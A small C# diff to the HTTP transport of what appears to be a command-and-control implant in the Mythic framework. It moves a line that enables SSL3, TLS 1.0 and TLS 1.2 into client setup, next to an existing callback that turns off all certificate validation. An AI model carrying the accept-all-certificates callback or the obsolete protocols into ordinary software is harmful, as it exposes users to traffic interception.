@@ -101,6 +101,7 @@ namespace Mythic.C2Profiles
             // Necessary to disable certificate validation
             ServicePointManager.ServerCertificateValidationCallback =
                 delegate { return true; };
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
 #if USE_WEBCLIENT
             client = new WebClient();
             client.Proxy = null;
@@ -156,7 +157,6 @@ namespace Mythic.C2Profiles
                 try
                 {
 #if USE_HTTPWEB
-                    ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                     HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(Endpoint);
                     request.KeepAlive = false;
                     request.Method = "Post";
